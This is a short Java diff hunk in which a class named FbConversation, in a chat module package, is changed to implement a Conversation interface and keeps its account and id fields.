@@ -1,6 +1,6 @@
 package com.android.networking.module.chat;
 
-public class FbConversation {
+public class FbConversation implements Conversation {
 
 	protected String account;
 	protected String id;
